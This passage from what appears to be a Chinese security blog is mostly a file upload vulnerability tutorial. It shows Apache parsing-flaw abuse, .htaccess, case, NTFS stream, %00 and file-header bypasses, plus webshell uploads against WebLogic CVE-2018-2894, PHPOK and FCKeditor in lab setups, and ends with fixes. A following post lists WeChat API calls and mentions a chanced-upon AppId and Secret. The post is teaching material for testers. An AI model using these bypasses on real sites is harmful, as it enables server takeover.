然后访问xx.jpg/.php,在这个目录下就会生成一句话木马shell.php。同样利用phpstudy说明，上传1.jpg格式的文件，内容为访问phpinfo，如下即可触发： 0x05-3、Apache 解析漏洞​ Apache是世界使用排名第一的Web服务器软件。它可以运行在几乎所有广泛使用的计算机平台上，由于其跨平台和安全性被广泛使用，是最流行的Web服务器端软件之一。它快速、可靠并且可通过简单的API扩充，将Perl/Python等解释器编译到服务器中。 ​ Apache 在1.x和2.x版本中存在解析漏洞，例如如下地址格式： www.xxxx.com/apache.php.bbb.aaa Apache从右至左开始判断后缀，若aaa非可识别后缀，再判断bbb，直到找到可识别后缀为止，然后将该可识别后缀进解析，因此如上地址解析为访问apache.php文件。 ​ 那么为什么会产生此问题原因，在Apache的官方网站上，有一句这么关于“extension”的解释： 地址：http://httpd.apache.org/docs/current/mod/directive-dict.html extension In general, this is the part of the filename which follows the last dot. However, Apache recognizes multiple filename extensions, so if a filename contains more than one dot, each dot-separated part of the filename following the first dot is an extension. For example, the filename file.html.en contains two extensions: .html and .en. For Apache directives, you may specify extensions with or without the leading dot. In addition, extensions are not case sensitive. ​ 通过这个解释可以看出来，Apache允许文件有多个后缀名，并会按照第一个点来分析文件后缀，例如file.html.en。Apache按照每个点来分割后缀名，因此此文件名为.html、.en。由于en后缀不被识别，便继续向前解析。 ​ 另外对于Apache解析漏洞的正确说法应该是，使用module模式与php结合的所有版本 apache存在未知扩展名解析漏洞，使用fastcig模式与php结合的所有版本apache不存在此漏洞。而是否解析的后缀名在文件mime.types中查找是否出现。 ​ 此处使用phpstudy测试，利用dvwa的文件上传功能，上传1.php.wwe。结果解析如下： 0x06、测试方法对于文件上传漏洞方式和举例此处采用一个文件靶场，地址：https://github.com/c0ny1/upload-labs 以下将利用靶场其中的一部分内容来举例说明文件上传漏洞的产生和效果。 环境：Ubuntu 18、Windows phpStudy (采用不一样的系统，为了在不同系统的差异做演示) WEB容器：Apache 2.0 语言：PHP 抓包工具：Burp Suite Pro 验证工具：Hackbar插件 0x06-1、前端验证此种验证形式在很多网站、CMS都有使用，只在前端利用JS来做效验，采用禁用JS上传、抓包上传都可以绕过此处限制。此处采用抓包演示。 点击上传文件，选择已经改成“.jpg”后缀的后门文件。修改burp中的文件后缀信息。 访问已经上传的文件，利用Hackbar访问phpinfo()。可以看到后门已经得到执行。 0x06-2、.htaccess规则文件绕过​ 在利用.htaccess文件之前，我们先来了解一下什么是.htaccess规则文件。.htaccess文件(或者”分布式配置文件”）,全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。 ​ 概述来说，.htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。 ​ 在一些启用了.htaccess文件的网站上就可以使用此文件类型来绕过限制较全面的黑名单过滤。 ​ 先上传一个.htaccess文件，内容为：AddType application/x-httpd-php .aaa。如下： ​ 然后再上传文件后缀为.aaa的文件，让其解析为php类型文件。 ​ 上传成功后访问此上传文件，访问如下： 0x06-3、文件名后缀大小写混合绕过​ 在对后缀的判断中，如果只是对字符串进行单独的比较来判断是不是限制文件，可以采用后缀名大小写绕过形式。如下形式： ​ 访问上传成功的文件： 0x06-4、Windows文件流特性绕过​ 在讨论这种特性之前，我们先来认识一下Windows文件流。流文件，即NTFS交换数据流（alternate data streams，简称ADS），是NTFS磁盘格式的一个特性，在NTFS文件系统下，每个文件都可以存在多个数据流，就是说除了主文件流之外还可以有许多非主文件流寄宿在主文件流中，它使用资源派生来维持与文件相关的信息。创建一个数据交换流文件的方法很简单，命令为“宿主文件:准备与宿主文件关联的数据流文件”。 ​ 详细相关介绍和内容可以查看文章：https://www.freebuf.com/column/143101.html。此处不做深入解释。 上传文件为xxx.php::$DATA类型的文件。可以看到上传的文件为xxx.php::$data。 我们访问的时候就可以直接访问xxx.php文件。 0x06-5、%00截断绕过​ 以上问题被绕过的根本原因是采用了一些有缺陷的黑名单限制，一般采用白名单的限制会减少相当多的绕过问题产生，但是并不意味着一定安全，在某些没有处理严格的程序上，仍然可以采用截断绕过的形式。 首先我们来看这段上传的代码： $is_upload = false; $msg = null; if(isset($_POST[&#39;submit&#39;])){ $ext_arr = array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;); $file_ext = substr($_FILES[&#39;upload_file&#39;][&#39;name&#39;],strrpos($_FILES[&#39;upload_file&#39;][&#39;name&#39;],&quot;.&quot;)+1); if(in_array($file_ext,$ext_arr)){ $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]; $img_path = $_POST[&#39;save_path&#39;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; if(move_uploaded_file($temp_file,$img_path)){ $is_upload = true; } else { $msg = &quot;上传失败&quot;; } } else { $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;; } } 可以看出代码采用的白名单校验，只允许上传图片格式，理论上这个上传是不好绕过的。但是后面采用保存文件的时候，是路径拼接的形式，而路径又是从前端获取，所以我们可以采用在路径上截断。如下上传，显示文件路径中有个空格，这并不是真正意义上的空格，而是%00截断后显示成的空格。 访问上传地址路径： 0x06-5、文件头检测绕过​ 提到文件头检测，我们就先来认识一下常见文件的文件头格式。我们先打开一个正常的JPG图片格式文件，查看文件的文件头十六进制。采用010Editor。 ​ 右边栏中有明显的JFIF存储格式字样，文件头前十个字节为FF D8 FF E0 00 10 4A 46 49 46，其中开头标红的为标记码，FF D8代表SOI标记，意思是图像文件开始值。4A 46 49 46代表字符串JFIF标记。 关于JPEG文件格式介绍可以阅读：https://www.cnblogs.com/sddai/p/5666924.html ​ 然后我们再打开一份PNG文件格式的图片，同样采用010Editor来查看其十六进制。 ​ 对于的开头4字节为右栏中‰PNG字样，PNG的8字节文件署名域用来识别该文件是不是PNG文件。也就是89 50 4E 47 0D 0A 1A 0A。 关于PNG文件格式可以阅读：https://blog.csdn.net/qq_21950929/article/details/79198814 ​ 同样打开一份GIF文件格式图片，用010Editor来打开查看文件。 ​ 文件十六进制中可以看到，其中47 49 46 38 39 61，代表了右栏中的GIF89a，这六个字节作为了GIF文件格式头的开头文件。而在其后的绕过中就采用了GIF89a这个字符串。 关于GIF文件格式可以阅读：https://www.jianshu.com/p/df52f1511cf8 了解过文件格式后，我们来看这个文件格式检测绕过形式，首先查看代码，为了方便演示修改了源代码对文件格式的获取，此处只读取文件的前两个字节值： function getReailFileType($filename){ $file = fopen($filename, &quot;rb&quot;); $bin = fread($file, 2); //只读2字节 fclose($file); $strInfo = @unpack(&quot;C2chars&quot;, $bin); $typeCode = intval($strInfo[&#39;chars1&#39;].$strInfo[&#39;chars2&#39;]); $fileType = &#39;&#39;; switch($typeCode){ case 255216: $fileType = &#39;jpg&#39;; break; case 13780: $fileType = &#39;png&#39;; break; case 7173: $fileType = &#39;gif&#39;; break; default: $fileType = &#39;unknown&#39;; } return $fileType; } $is_upload = false; $msg = null; if(isset($_POST[&#39;submit&#39;])){ $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]; $file_type = getReailFileType($temp_file); if($file_type == &#39;unknown&#39;){ $msg = &quot;文件未知，上传失败！&quot;; }else{ $file_ext = substr($_FILES[&#39;upload_file&#39;][&#39;name&#39;],strrpos($_FILES[&#39;upload_file&#39;][&#39;name&#39;],&quot;.&quot;)+1); //此处为了方便演示添加了file_ext 变量 $img_path = UPLOAD_PATH.&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; if(move_uploaded_file($temp_file,$img_path)){ $is_upload = true; } else { $msg = &quot;上传出错！&quot;; } } } 然后上传php文件，修改文件内容，添加文件头GIF89a： 这种添加形式类似于在hex中修改添加： 然后在访问以上传的文件： 0x07、利用工具进行FUZZ​ 很多网站对上传进行拦截的时候采取的是黑名单校验，当我们看到黑名单的时候就可以考虑采取修改后缀、截断等方式尝试绕过。 ​ 我们采用一个工具：https://github.com/c0ny1/upload-fuzz-dic-builder 来生成fuzz的字典。执行命令: python upload-fuzz-dic-builder.py -n test -a jpg -l php -m apache --os win -o upload_file.txt ​ 把生成的字典导入burp中，同时取消payload-encoding的选中状态。执行后可以看到有些php文件上传成功。然后访问其中上传成功的文件，查看是否执行。 访问如图中的地址文件，可以看到上传成功： 0x08、实战演示演示漏洞为：CVE-2018-2894 漏洞环境：Linux Weblogic 12.2 漏洞下载地址：https://github.com/vulhub/vulhub/tree/master/weblogic/CVE-2018-2894 漏洞介绍：WebLogic管理端未授权的两个页面存在任意上传getshell漏洞，可直接获取权限。两个页面分别为/ws_utc/begin.do，/ws_utc/config.do。 影响范围为：Oracle WebLogic Server，版本10.3.6.0，12.1.3.0，12.2.1.2，12.2.1.3。 下载好vulhub后，进入相应的CVE目录，执行如下命令： docker-compose up -d 等到docker构建结束，会在7001端口开放一个服务，如下所示： 此处需要登陆账号和密码，正常情况下是尝试弱口令进后台上传文件，此处方便演示，从构建日志中查看密码： docker-compose logs | grep password 查看结果： weblogic_1 | ----&gt; &#39;weblogic&#39; admin password: oZUcqr8j weblogic_1 | admin password : [oZUcqr8j] weblogic_1 | * password assigned to an admin-level user. For * 登陆后界面如下： 点击左侧中的base_domain选项，再点击下面的高级选项，从高级中启用web测试页，保存。 然后访问http://192.168.120.132:7001/ws_utc/config.do页面，设置Work Home Dir，可以看到其中已经填写一个目录，此目录访问需要登陆，修改为P牛的建议路径： /u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css 原路径为： /u01/oracle/user_projects/domains/base_domain/tmp/WSTestPageWorkDir 在当前页面中选择安全-&gt;增加，上传webshell 然后从放回页面中查看id项时间戳，访问路径/ws_utc/css/config/keystore/时间戳_文件名 然后执行命令whoami: 0x09、CMS实战演示0x09-1、PHPOK 任意文件上传演示漏洞为：phpok 任意文件上传 漏洞环境：Windows phpStudy 漏洞环境下载：https://download.phpok.com/4.8.338.zip 漏洞介绍：phpok 4.8.338版本管理后台存在任意文件上传漏洞，攻击者可利用漏洞上传任意文件，获取网站权限。 下载文件后，把解压的文件放入phpstudy中的www目录中，此处修改了版本号目录为phpok。然后访问本地地址：http://localhost/phpok，会自动进入安装页面，填写数据库密码，创建账号后自动进入安装页面，安装完成后显示如下： 使用一开始创建的账号密码登陆，登陆成功后在后侧的选择栏处选择工具-&gt;附件分类管理。 点击右侧上方的创建资源分类，然后在支持的附件类型中创建php文件类型。 选择左侧的内容管理-&gt;资讯中心-&gt;行业管理 点击页面中的选择图片-&gt;上传附近选择添加的附件类型-&gt;选择php文件上传，上传成功后点击上传的图片，选择预览就可以看到文件目录的地址 访问地址文件后门，可以看到执行代码成功 漏洞修复：此问题在高版本修复，及时升级到高版本处理，目前最新版本为5.2.116。 0x09-2、FCKeditor 2.4.3 文件上传演示漏洞为：FCKeditor 2.4.3 文件上传 漏洞环境：Windows phpStudy 漏洞环境下载：https://github.com/treadmillian/fckeditor.git 漏洞介绍：FCKeditor /fckeditor/editor/filemanager/upload/php/upload.php 文件上传漏洞。 首先从GitHub下载文件，放到phpStudy的www目录中，同时修改config.php文件，修改UserFilesPath参数为fck目录下的地址，修改如下： 文件地址： \\fckeditor\\editor\\filemanager\\browser\\default\\connectors\\php\\config.php 访问地址：http://localhost/fckeditor/editor/filemanager/browser/default/connectors/test.html# 选择文件上传，由于2.4.3在文件配置已经进行了后缀的限制，默认限制为： array(&#39;html&#39;,&#39;htm&#39;,&#39;php&#39;,&#39;php2&#39;,&#39;php3&#39;,&#39;php4&#39;,&#39;php5&#39;,&#39;phtml&#39;,&#39;pwml&#39;,&#39;inc&#39;,&#39;asp&#39;,&#39;aspx&#39;,&#39;ascx&#39;,&#39;jsp&#39;,&#39;cfm&#39;,&#39;cfc&#39;,&#39;pl&#39;,&#39;bat&#39;,&#39;exe&#39;,&#39;com&#39;,&#39;dll&#39;,&#39;vbs&#39;,&#39;js&#39;,&#39;reg&#39;,&#39;cgi&#39;,&#39;htaccess&#39;,&#39;asis&#39;,&#39;sh&#39;,&#39;shtml&#39;,&#39;shtm&#39;,&#39;phtm&#39;) 对于此处漏洞我们采用空格绕过，先上传一个JPG的图片，抓包修改后缀，添加空格如下： 访问上传产生的路径文件，路径会显示在页面中： http://localhost/fckeditor/editor/filemanager/browser/default/connectors/uploads/file/05091707156.php 执行一句话木马文件： 漏洞修复：由于此处使用黑名单校验，可以根据需要的类型修改为白名单参数。 0x10、漏洞修复关于文件上传漏洞的产生和修改此处讨论两种文件上传漏洞的情况和修复： 1、代码未判断文件类型或者文件类型限制不完全，一般这种是黑名单或者没有限制，建议添加白名单限制参数数组，固定为图片或文本格式文件。例如如下： if(isset($_POST[&#39;submit&#39;])){ $ext_arr = array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;); $file_ext = substr($_FILES[&#39;upload_file&#39;][&#39;name&#39;],strrpos($_FILES[&#39;upload_file&#39;][&#39;name&#39;],&quot;.&quot;)+1); if(in_array($file_ext,$ext_arr)){ $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]; $img_path = UPLOAD_PATH.&#39;/&#39;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; if(move_uploaded_file($temp_file,$img_path)){ $is_upload = true; } else { $msg = &quot;上传失败&quot;; } } else { $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;; } } 2、如果是使用WEB中间件存在上传，或者是CMS存在文件上传漏洞，根据官方建议安装补丁升级版本，或者使用官方推荐的临时修改策略来限制问题的产生和利用。","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"/tags/web安全/"}]},{"title":"微信公众号接口","slug":"微信公众号接口","date":"2019-05-27T03:32:58.000Z","updated":"2019-05-27T03:33:38.075Z","comments":true,"path":"2019/05/微信公众号接口/","link":"","permalink":"/2019/05/微信公众号接口/","excerpt":"","text":"在一个偶然的机会获取到了一对微信AppId与Secret，于是整理了一下常用和有用的微信公众号信息获取的接口，以下是部分微信接口调用示例和说明。 1、平台开发者获取access_tokenaccess_token是公众号的全局唯一接口调用凭据，公众号调用各接口时都需使用access_token。access_token的有效期目前为2个小时，需定时刷新，重复获取将导致上次获取的access_token失效。 a、接口调用请求说明http请求方式: GET https://api.weixin.qq.com/cgi-bin/token?grant_type=client_credential&amp;appid=APPID&amp;secret=APPSECRET b、参数说明参数 是否必须 说明 grant_type 是 获取access_token填写client_credential appid 是 第三方用户唯一凭证 secret 是 第三方用户唯一凭证密钥，即appsecret c、返回说明微信会返回下述JSON数据包给公众号： {&quot;access_token&quot;:&quot;ACCESS_TOKEN&quot;,&quot;expires_in&quot;:7200} 2、获取微信服务器IP地址如果公众号基于安全等考虑，需要获知微信服务器的IP地址列表，以便进行相关限制，可以通过该接口获得微信服务器IP地址列表或者IP网段信息。 a、接口调用请求说明http请求方式: GET https://api.weixin.qq.com/cgi-bin/getcallbackip?access_token=ACCESS_TOKEN b、参数说明参数 是否必须 说明 access_token 是 公众号的access_token c、返回说明正常情况下，微信会返回下述JSON数据包给公众号： { &quot;ip_list&quot;: [ &quot;127.0.0.1&quot;, &quot;127.0.0.2&quot;, &quot;101.226.103.0/25&quot; ] } 3、自定义菜单查询接口使用接口创建自定义菜单后，开发者还可使用接口查询自定义菜单的结构。另外请注意，在设置了个性化菜单后，使用本自定义菜单查询接口可以获取默认菜单和全部个性化菜单信息。 a、请求说明http请求方式：GET https://api.weixin.qq.com/cgi-bin/menu/get?access_token=ACCESS_TOKEN b、参数说明参数 是否必须 说明 access_token 是 公众号的access_token c、返回说明对应创建接口，正确的Json返回结果: { &quot;menu&quot;: { &quot;button&quot;: [ { &quot;type&quot;: &quot;click&quot;, &quot;name&quot;: &quot;今日歌曲&quot;, &quot;key&quot;: &quot;V1001_TODAY_MUSIC&quot;, &quot;sub_button&quot;: [ ] }, { &quot;name&quot;: &quot;菜单&quot;, &quot;sub_button&quot;: [ { &quot;type&quot;: &quot;view&quot;, &quot;name&quot;: &quot;搜索&quot;, &quot;url&quot;: &quot;http://www.soso.com/&quot;, &quot;sub_button&quot;: [ ] } ] } ] } } 4、自定义菜单删除接口使用接口创建自定义菜单后，开发者还可使用接口删除当前使用的自定义菜单。另请注意，在个性化菜单时，调用此接口会删除默认菜单及全部个性化菜单。 a、请求说明http请求方式：GET https://api.weixin.qq.com/cgi-bin/menu/delete?access_token=ACCESS_TOKEN b、参数说明参数 是否必须 说明 access_token 是 公众号的access_token c、返回说明对应创建接口，正确的Json返回结果: {&quot;errcode&quot;:0,&quot;errmsg&quot;:&quot;ok&quot;} 5、添加客服帐号开发者可以通过本接口为公众号添加客服账号，每个公众号最多添加10个客服账号。 a、接口调用请求http请求方式: POST https://api.weixin.qq.com/customservice/kfaccount/add?access_token=ACCESS_TOKEN b、POST数据示例{ &quot;kf_account&quot; : &quot;test1@test&quot;, &quot;nickname&quot; : &quot;客服1&quot;, &quot;password&quot; : &quot;pswmd5&quot;, } c、返回说明正确时的JSON返回结果 { &quot;errcode&quot; : 0, &quot;errmsg&quot; : &quot;ok&quot;, } 6、获取所有客服账号开发者通过本接口，获取公众号中所设置的客服基本信息，包括客服工号、客服昵称、客服登录账号。 a、接口调用请求http请求方式: GET https://api.weixin.qq.com/cgi-bin/customservice/getkflist?access_token=ACCESS_TOKEN b、返回说明{ &quot;kf_list&quot;: [ { &quot;kf_account&quot;: &quot;test1@test&quot;, &quot;kf_nick&quot;: &quot;ntest1&quot;, &quot;kf_id&quot;: &quot;1001&quot; &quot;kf_headimgurl&quot;: &quot; http://mmbiz.qpic.cn/mmbiz/4whpV1VZl2iccsvYbHvnphkyGtnvjfUS8Ym0GSaLic0FD3vN0V8PILcibEGb2fPfEOmw/0&quot; }, { &quot;kf_account&quot;: &quot;test2@test&quot;, &quot;kf_nick&quot;: &quot;ntest2&quot;, &quot;kf_id&quot;: &quot;1002&quot; &quot;kf_headimgurl&quot;: &quot; http://mmbiz.qpic.cn/mmbiz/4whpV1VZl2iccsvYbHvnphkyGtnvjfUS8Ym0GSaLic0FD3vN0V8PILcibEGb2fPfEOmw /0&quot; } ] } 7、修改客服帐号开发者可以通过本接口为公众号修改客服账号。 a、接口调用请求http请求方式: POST https://api.weixin.qq.com/customservice/kfaccount/update?access_token=ACCESS_TOKEN b、POST数据示例{ &quot;kf_account&quot; : &quot;test1@test&quot;, &quot;nickname&quot; : &quot;客服1&quot;, &quot;password&quot; : &quot;pswmd5&quot;, } c、返回说明正确时的JSON返回结果 { &quot;errcode&quot; : 0, &quot;errmsg&quot; : &quot;ok&quot;, } 8、删除客服帐号开发者可以通过该接口为公众号删除客服帐号。 a、接口调用请求http请求方式: GET https://api.weixin.qq.com/customservice/kfaccount/del?access_token=ACCESS_TOKEN b、POST数据示例{ &quot;kf_account&quot; : &quot;test1@test&quot;, &quot;nickname&quot; : &quot;客服1&quot;, &quot;password&quot; : &quot;pswmd5&quot;, } c、返回说明正确时的JSON返回结果 { &quot;errcode&quot; : 0, &quot;errmsg&quot; : &quot;ok&quot;, } 9、用户授权登陆第三方应用第三方使用网站应用授权登录前请注意已获取相应网页授权作用域（scope=snsapi_login）。 第一步https://open.weixin.qq.com/connect/qrconnect?appid=APPID&amp;redirect_uri=REDIRECT_URI&amp;response_type=code&amp;scope=SCOPE&amp;state=STATE#wechat_redirect 参数说明参数 是否必须 说明 appid 是 应用唯一标识 redirect_uri 是 请使用urlEncode对链接进行处理 response_type 是 填code scope 是 应用授权作用域，拥有多个作用域用逗号（,）分隔，网页应用目前仅填写snsapi_login即 state 否 用于保持请求和回调的状态，授权请求后原样带回给第三方。该参数可用于防止csrf攻击（跨站请求伪造攻击），建议第三方带上该参数，可设置为简单的随机数加session进行校验 返回说明用户允许授权后，将会重定向到redirect_uri的网址上，并且带上code和state参数 redirect_uri?code=CODE&amp;state=STATE 第二步通过code获取access_token https://api.weixin.qq.com/sns/oauth2/access_token?appid=APPID&amp;secret=SECRET&amp;code=CODE&amp;grant_type=authorization_code 参数说明参数 是否必须 说明 appid 是 应用唯一标识，在微信开放平台提交应用审核通过后获得 secret 是 应用密钥AppSecret，在微信开放平台提交应用审核通过后获得 code 是 填写第一步获取的code参数 grant_type 是 填authorization_code 返回说明正确的返回： { &quot;access_token&quot;:&quot;ACCESS_TOKEN&quot;, &quot;expires_in&quot;:7200, &quot;refresh_token&quot;:&quot;REFRESH_TOKEN&quot;, &quot;openid&quot;:&quot;OPENID&quot;, &quot;scope&quot;:&quot;SCOPE&quot;, &quot;unionid&quot;: &quot;o6_bmasdasdsad6_2sgVt7hMZOPfL&quot; } 第三步获取access_token后，进行接口调用，有以下前提： 1. access_token有效且未超时； 2. 微信用户已授权给第三方应用帐号相应接口作用域（scope）。 接口作用域（scope），能调用的接口有以下其中snsapi_base属于基础接口，若应用已拥有其它scope权限，则默认拥有snsapi_base的权限。 授权作用域（scope） 接口 接口说明 snsapi_base /sns/oauth2/access_token 通过code换取access_token、refresh_token和已授权scope snsapi_base /sns/oauth2/refresh_token 刷新或续期access_token使用 snsapi_base /sns/auth 检查access_token有效性 snsapi_userinfo /sns/userinfo 获取用户个人信息 拉取用户信息(需scope为 snsapi_userinfo)http：GET https://api.weixin.qq.com/sns/userinfo?access_token=ACCESS_TOKEN&amp;openid=OPENID&amp;lang=zh_CN 参数说明参数 描述 access_token 网页授权接口调用凭证,注意：此access_token与基础支持的access_token不同 openid 用户的唯一标识 lang 返回国家地区语言版本，zh_CN 简体，zh_TW 繁体，en 英语 返回说明正确时返回的JSON数据包如下： {&quot;openid&quot;:&quot; OPENID&quot;, &quot; nickname&quot;: NICKNAME, &quot;sex&quot;:&quot;1&quot;, &quot;province&quot;:&quot;PROVINCE&quot; &quot;city&quot;:&quot;CITY&quot;, &quot;country&quot;:&quot;COUNTRY&quot;, &quot;headimgurl&quot;: &quot;http://wx.qlogo.cn/mmopen/g3MonUZtNHkdmzicIlibx6iaFqAc56vxLSUfpb6n5WKSYVY0ChQKkiaJSgQ1dZuTOgvLLrhJbERQQ4eMsv84eavHiaiceqxibJxCfHe/46&quot;, &quot;privilege&quot;:[ &quot;PRIVILEGE1&quot; &quot;PRIVILEGE2&quot; ], &quot;unionid&quot;: &quot;o6_bmasdasdsad6_2sgVt7hMZOPfL&quot; } 检验授权凭证（access_token）是否有效http：GET https://api.weixin.qq.com/sns/auth?access_token=ACCESS_TOKEN&amp;openid=OPENID 参数说明参数 描述 access_token 网页授权接口调用凭证,注意：此access_token与基础支持的access_token不同 openid 用户的唯一标识 返回说明正确的JSON返回结果： { &quot;errcode&quot;:0,&quot;errmsg&quot;:&quot;ok&quot;} 错误时的JSON返回示例： { &quot;errcode&quot;:40003,&quot;errmsg&quot;:&quot;invalid openid&quot;} 10、批量获取用户基本信息请求说明http请求方式: POST https://api.weixin.qq.com/cgi-bin/user/info/batchget?access_token=ACCESS_TOKEN POST数据示例{ &quot;user_list&quot;: [ { &quot;openid&quot;: &quot;otvxTs4dckWG7imySrJd6jSi0CWE&quot;, &quot;lang&quot;: &quot;zh-CN&quot; }, { &quot;openid&quot;: &quot;otvxTs_JZ6SEiP0imdhpi50fuSZg&quot;, &quot;lang&quot;: &quot;zh-CN&quot; } ] } 返回说明{ &quot;user_info_list&quot;: [ { &quot;subscribe&quot;: 1, &quot;openid&quot;: &quot;otvxTs4dckWG7imySrJd6jSi0CWE&quot;, &quot;nickname&quot;: &quot;iWithery&quot;, &quot;sex&quot;: 1, &quot;language&quot;: &quot;zh_CN&quot;, &quot;city&quot;: &quot;Jieyang&quot;, &quot;province&quot;: &quot;Guangdong&quot;, &quot;country&quot;: &quot;China&quot;, &quot;headimgurl&quot;: &quot;http://wx.qlogo.cn/mmopen/xbIQx1GRqdvyqkMMhEaGOX802l1CyqMJNgUzKP8MeAeHFicRDSnZH7FY4XB7p8XHXIf6uJA2SCun TPicGKezDC4saKISzRj3nz/0&quot;, &quot;subscribe_time&quot;: 1434093047, &quot;unionid&quot;: &quot;oR5GjjgEhCMJFyzaVZdrxZ2zRRF4&quot;, &quot;remark&quot;: &quot;&quot;, &quot;groupid&quot;: 0, &quot;tagid_list&quot;:[128,2] }, { &quot;subscribe&quot;: 0, &quot;openid&quot;: &quot;otvxTs_JZ6SEiP0imdhpi50fuSZg&quot;, &quot;unionid&quot;: &quot;oR5GjjjrbqBZbrnPwwmSxFukE41U&quot;, } ] } 11、获取微信公众号用户列表调用请求说明http请求方式: GET（请使用https协议） https://api.weixin.qq.com/cgi-bin/user/get?access_token=ACCESS_TOKEN&amp;next_openid=NEXT_OPENID 参数说明参数 是否必须 说明 access_token 是 调用接口凭证 next_openid 是 第一个拉取的OPENID，不填默认从头开始拉取 返回说明正确时返回JSON数据包： {&quot;total&quot;:2,&quot;count&quot;:2,&quot;data&quot;:{&quot;openid&quot;:[&quot;&quot;,&quot;OPENID1&quot;,&quot;OPENID2&quot;]},&quot;next_openid&quot;:&quot;NEXT_OPENID&quot;} 参数说明参数 说明 total 关注该公众账号的总用户数 count 拉取的OPENID个数，最大值为10000 data 列表数据，OPENID的列表 next_openid 拉取列表的最后一个用户的OPENID 12、企业新版微信客服获取客服基本信息http请求方式: GET https://api.weixin.qq.com/cgi-bin/customservice/getkflist?access_token=ACCESS_TOKEN 返回说明返回数据示例（正确时的JSON返回结果）： { &quot;kf_list&quot; : [ { &quot;kf_account&quot; : &quot;test1@test&quot;, &quot;kf_headimgurl&quot; : &quot;http://mmbiz.qpic.cn/mmbiz/4whpV1VZl2iccsvYbHvnphkyGtnvjfUS8Ym0GSaLic0FD3vN0V8PILcibEGb2fPfEOmw/0&quot;, &quot;kf_id&quot; : &quot;1001&quot;, &quot;kf_nick&quot; : &quot;ntest1&quot;, &quot;kf_wx&quot; : &quot;kfwx1&quot; }, { &quot;kf_account&quot; : &quot;test3@test&quot;, &quot;kf_headimgurl&quot; : &quot;http://mmbiz.qpic.cn/mmbiz/4whpV1VZl2iccsvYbHvnphkyGtnvjfUS8Ym0GSaLic0FD3vN0V8PILcibEGb2fPfEOmw/0&quot;, &quot;kf_id&quot; : &quot;1003&quot;, &quot;kf_nick&quot; : &quot;ntest3&quot;, &quot;invite_wx&quot; : &quot;kfwx3&quot;, &quot;invite_expire_time&quot; : 123456789, &quot;invite_status&quot; : &quot;waiting&quot; } ] } 参数说明参数 说明 kf_account 完整客服帐号，格式为：帐号前缀@公众号微信号 kf_nick 客服昵称 kf_id 客服编号 kf_headimgurl 客服头像 kf_wx 如果客服帐号已绑定了客服人员微信号，则此处显示微信号 invite_wx 如果客服帐号尚未绑定微信号，但是已经发起了一个绑定邀请，则此处显示绑定邀请的微信号 invite_expire_time 如果客服帐号尚未绑定微信号，但是已经发起过一个绑定邀请，邀请的过期时间，为unix 时间戳 invite_status 邀请的状态，有等待确认“waiting”，被拒绝“rejected”，过期“expired” 13、获取聊天记录调用说明http请求方式: POST https://api.weixin.qq.com/customservice/msgrecord/getmsglist?access_token=ACCESS_TOKEN POST数据示例如下： { &quot;starttime&quot; : 987654321, &quot;endtime&quot; : 987654321, &quot;msgid&quot; : 1, &quot;number&quot; : 10000 } 参数说明参数 说明 starttime 起始时间，unix时间戳 endtime 结束时间，unix时间戳，每次查询时段不能超过24小时 msgid 消息id顺序从小到大，从1开始 number 每次获取条数，最多10000条 返回说明{ &quot;recordlist&quot; : [ { &quot;openid&quot; : &quot;oDF3iY9WMaswOPWjCIp_f3Bnpljk&quot;, &quot;opercode&quot; : 2002, &quot;text&quot; : &quot; 您好，客服test1为您服务。&quot;, &quot;time&quot; : 1400563710, &quot;worker&quot; : &quot;test1@test&quot; }, { &quot;openid&quot; : &quot;oDF3iY9WMaswOPWjCIp_f3Bnpljk&quot;, &quot;opercode&quot; : 2003, &quot;text&quot; : &quot;你好，有什么事情？&quot;, &quot;time&quot; : 1400563731, &quot;worker&quot; : &quot;test1@test&quot; } ], &quot;number&quot;:2, &quot;msgid&quot;:20165267 } 参数说明参数 说明 worker 完整客服帐号，格式为：帐号前缀@公众号微信号 openid 用户标识 opercode 操作码，2002（客服发送信息），2003（客服接收消息） text 聊天记录 time 操作时间，unix时间戳 参考资料： 1、微信公众平台开发概述 2、微信开放平台","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"/tags/web安全/"}]},{"title":"基于dvmDexFileOpenPartial的动态脱壳","slug":"基于dvmDexFileOpenPartial的动态脱壳","date":"2019-05-15T06:25:33.000Z","updated":"2019-07-26T09:55:41.915Z","comments":true,"path":"2019/05/基于dvmDexFileOpenPartial的动态脱壳/","link":"","permalink":"/2019/05/基于dvmDexFileOpenPartial的动态脱壳/","excerpt":"","text":"1、dvmDexFileOpenPartial脱壳原理基于libdvm.so下dvmDexFileOpenPartial的文件脱壳，当然如果是新版的加固方式一般不可行，因为会基本会重写dvmDexFileOpenPartial方法。如此，先了解一下libdvm.so的方法dvmDexFileOpenPartial是干什么的。 加密dex文件在软件运行时，必然会解密加载到内存中运行，而dvmDexFileOpenPartial方法的参数： int dvmDexFileOpenPartial(const void* addr, int len, DvmDex** ppDvmDex) 第一个参数代表dex文件的基地址，第二个参数代表dex文件的长度，第三个参数代表出参，dex文件的类，方法等信息。 方法的源码解读：从源码看Dex Dump于dvmDexFileOpenPartial原理 断点脱壳原理分析:dvmDexFileOpenPartial断点脱壳原理分析 示例APP：jscrack 由于使用的Android 4.4.4的环境，加载模式为Dalvik虚拟机模式，libdvm.so则是此模式下的文件，当然在Android 